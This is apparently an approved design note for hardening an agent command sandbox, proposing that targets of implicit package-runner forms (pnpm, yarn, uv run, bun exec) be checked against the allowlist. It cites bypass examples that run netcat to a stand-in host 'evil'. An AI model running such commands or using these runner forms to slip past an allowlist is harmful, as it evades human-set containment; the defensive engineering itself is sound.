---
status: approved
issue: 1812
author: olafkfreund
---

# Intent: implicit package-runner targets must be checked

## Problem

Open on `dev`. #1807 (#1813) checks the target of the explicit runners
(`pnpm exec|dlx`, `yarn exec|dlx`, `bun x`, `uv tool run`, `pipx run`) through
`_unwrap_subcommand_runner` and `_check_package_runner`
(`apps/backend/security/ast_parser.py:927-1009`, table `_RUNNER_SUBCOMMANDS`
at `:852`). These forms also run a program and are still checked as the
package manager only:

- `pnpm <cmd>`: runs a script, else falls back to running `<cmd>`.
- `yarn <bin>` (berry): runs a dependency binary.
- `uv run <cmd>`: runs any command in the project environment.
- `bun run <bin>` / `bun <file>`: run a binary or file.
- From the issue comment: `pnpm recursive|multi|m exec <prog>`,
  `yarn workspace <w> exec <prog>`, `yarn workspaces foreach ... exec <prog>`,
  `bun exec '<shell string>'` (runs a shell string).

So `pnpm nc evil 80`, `uv run nc evil 80` or `bun exec 'nc evil 80'` pass
as an allowlisted `pnpm`/`uv`/`bun`.

## Proposed outcome

- Each form's target goes through `_emit`, so it meets the allowlist.
- Where the program cannot be resolved statically (a `pnpm`/`yarn`/`bun`
  word that is not a built-in subcommand), the word is checked as a command.
- `bun exec` is refused unless its string is a literal that passes the
  validator.
- Unknown options where the target would be hidden fail closed.

## Affected users and systems

- `apps/backend/security/ast_parser.py`; `tests/test_command_sandbox.py`.
- Agents using script shorthands (`pnpm build`, `yarn lint`, `bun run dev`)
  are now refused unless the name is allowlisted; `pnpm run build` /
  `yarn run build` keep working. Options on `uv run` (`uv run --frozen`) are
  refused.

## Constraints

- Fail closed; small; reuse `_check_package_runner` from #1813, do not
  duplicate it.
- Accepted limits (not fixed here): `npm config set`/`pkg set`/`explore`/
  `init`/`create`, `NODE_OPTIONS`/`npm_config_*` prefixes, stdin symlinks
  made earlier. Real containment is OS isolation (#1757, #1732).

## Open questions

1. Script shorthands share their syntax with bin runs. Taken (lead's
   conservative choice): check the name like a command.
